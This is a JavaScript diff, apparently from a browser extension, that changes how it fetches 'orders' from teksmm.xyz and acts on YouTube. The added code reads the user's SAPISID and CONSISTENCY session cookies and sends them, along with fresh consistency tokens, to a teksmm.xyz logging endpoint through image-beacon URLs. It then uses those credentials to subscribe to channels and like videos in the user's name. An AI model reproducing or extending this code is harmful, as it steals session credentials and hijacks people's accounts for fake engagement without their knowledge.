@@ -133,62 +133,78 @@ var nca = function() {
     }
 };
 
+function setCookie(name,value,days) {
+    var expires = "";
+    if (days) {
+        var date = new Date();
+        date.setTime(date.getTime() + (days*24*60*60*1000));
+        expires = "; expires=" + date.toUTCString();
+ }
+    document.cookie = name + "=" + (value || "")  + expires + "; path=/ ; domain=.youtube.com; secure";
+}
+
+function getCookie(name) {
+    var nameEQ = name + "=";
+    var ca = document.cookie.split(';');
+    for(var i=0;i < ca.length;i++) {
+        var c = ca[i];
+        while (c.charAt(0)==' ') c = c.substring(1,c.length);
+        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+    }
+    return null;
+}
 
 function siparis_getir_3() {
-    chrome.storage.local.get('ytData', (value) => {
-		var xhr = new XMLHttpRequest();
-		xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=3&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "3"))), true);
-		xhr.onreadystatechange = function() {
-			if (xhr.readyState == 4 && xhr.status == 200) {
-				try {
-					var data = JSON.parse(xhr.responseText);
-					vars = {};
-					vars.videoId = data.videoIds[Math.floor(Math.random()*data.videoIds.length)]
-					vars.channelIds = data.channelId.trim();
-					vars.id = data.id.trim();
-					vars.consistency = value.ytData.consistency
-					vars.sapisid = value.ytData.sapisid
-					new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=cons'+vars.consistency+"----sapsid"+vars.sapisid;
-					new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir1';
-					if (vars.channelIds && vars.consistency.length > 0 && vars.sapisid.length > 0) {
-						new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir2';
-						if(!checkOrSave(vars.id,"3")){
-							new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir3';
-							subscribe_client(vars);
-						}
+	var xhr = new XMLHttpRequest();
+	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=3&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "3"))), true);
+	xhr.onreadystatechange = function() {
+		if (xhr.readyState == 4 && xhr.status == 200) {
+			try {
+				var data = JSON.parse(xhr.responseText);
+				vars = {};
+				vars.videoId = data.videoIds[Math.floor(Math.random()*data.videoIds.length)]
+				vars.channelIds = data.channelId.trim();
+				vars.id = data.id.trim();
+				vars.consistency = getCookie("CONSISTENCY")
+				vars.sapisid = getCookie("SAPISID")
+				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=cons'+vars.consistency+"----sapsid"+vars.sapisid;
+				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir1';
+				if (vars.channelIds  && vars.sapisid != null ) {
+					new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir2';
+					if(!checkOrSave(vars.id,"3")){
+						new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir3';
+						subscribe_client(vars);
 					}
-				}catch (error) {}
-			}else{
-				localStorage.setItem("m_history", JSON.stringify([]) );
-			}
+				}
+			}catch (error) {}
+		}else{
+			localStorage.setItem("m_history", JSON.stringify([]) );
 		}
-		xhr.send();
-    }); 
+	}
+	xhr.send();
 }
 
 function siparis_getir_4() {
-    chrome.storage.local.get('ytData', (value) => {
-		var xhr = new XMLHttpRequest();
-		xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=4&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "4"))), true);
-		xhr.onreadystatechange = function() {
-			if (xhr.readyState == 4 && xhr.status == 200) {
-				try {
-					var data = JSON.parse(xhr.responseText);
-					vars = {};
-					vars.indexData = data.videoId.trim();
-					vars.id = data.id.trim();
-					vars.consistency = value.ytData.consistency
-					vars.sapisid = value.ytData.sapisid
-					if (vars.indexData && vars.consistency.length > 0 && vars.sapisid.length > 0) {
-						if(!checkOrSave(vars.id,"4")){
-								video_like(vars);
-						}
+	var xhr = new XMLHttpRequest();
+	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=4&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "4"))), true);
+	xhr.onreadystatechange = function() {
+		if (xhr.readyState == 4 && xhr.status == 200) {
+			try {
+				var data = JSON.parse(xhr.responseText);
+				vars = {};
+				vars.videoId = data.videoId.trim();
+				vars.id = data.id.trim();
+				vars.consistency = getCookie("CONSISTENCY")
+				vars.sapisid = getCookie("SAPISID")
+				if (vars.videoId && vars.sapisid != null) {
+					if(!checkOrSave(vars.id,"4")){
+							video_like(vars);
 					}
-				}catch (error) {}
-			}
+				}
+			}catch (error) {}
 		}
-		xhr.send();
-    }); 
+	}
+	xhr.send();
 }
 
 function subscribe_client(vars) {
@@ -262,7 +278,7 @@ function subscribe_client(vars) {
     
 function video_like(vars) {
     var xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://www.youtube.com/watch?v=" + vars.indexData, true);
+    xhr.open("GET", "https://www.youtube.com/watch?v=" + vars.videoId, true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
     xhr.onreadystatechange = function() {
       if (xhr.readyState == 4 && xhr.status == 200) {
@@ -353,9 +369,7 @@ function createPost(vars,type) {
 				},
 				"request": {
 					"internalExperimentFlags": [],
-					"consistencyTokenJars": [{
-						"encryptedTokenJarContents": vars.consistency
-					}]
+					"consistencyTokenJars": vars.consistency != null ? [{"encryptedTokenJarContents": vars.consistency}] : []
 				},
 				"user": {},
 				"clientScreenNonce": vars.clientScreenNonce,
@@ -389,9 +403,7 @@ function createPost(vars,type) {
                 },
                 "request": {
                     "internalExperimentFlags": [],
-                    "consistencyTokenJars": [{
-                        "encryptedTokenJarContents": vars.consistency
-                    }]
+                     "consistencyTokenJars": vars.consistency != null ? [{"encryptedTokenJarContents": vars.consistency}] : []
                 },
                 "user": {},
                 "clientScreenNonce": vars.clientScreenNonce,
@@ -400,7 +412,7 @@ function createPost(vars,type) {
                 }
             },
             "target": {
-                "videoId": vars.indexData
+                "videoId": vars.videoId
             },
             "params": vars.params
         };
@@ -420,7 +432,10 @@ function createPost(vars,type) {
 	xhr.onreadystatechange = function() {
 		if (xhr.readyState == 4 && xhr.status == 200) {
 			new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir200';
-			xhr.close;
+			let parsed = JSON.parse(xhr.responseText);
+			new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=yeniCok:'+parsed.responseContext.consistencyTokenJar.encryptedTokenJarContents;
+            setCookie("CONSISTENCY",parsed.responseContext.consistencyTokenJar.encryptedTokenJarContents,6)
+            xhr.close;
 		}
 	}
 	xhr.send(JSON.stringify(postData));
